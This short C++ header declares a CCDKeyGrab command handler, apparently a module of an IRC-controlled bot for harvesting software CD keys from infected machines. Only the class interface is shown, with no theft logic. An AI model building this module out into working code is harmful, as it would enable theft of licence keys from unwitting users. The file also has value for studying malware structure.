
#ifndef __CDKEYGRAB_H__
#define __CDKEYGRAB_H__

#include "commands.h"
#include "message.h"
#include "irc.h"

class CCDKeyGrab : public CCommandHandler
{
public:
	void Init();

	bool HandleCommand(CMessage *pMsg);

	command	m_cmdGet;
};

#endif // __CDKEYGRAB_H__
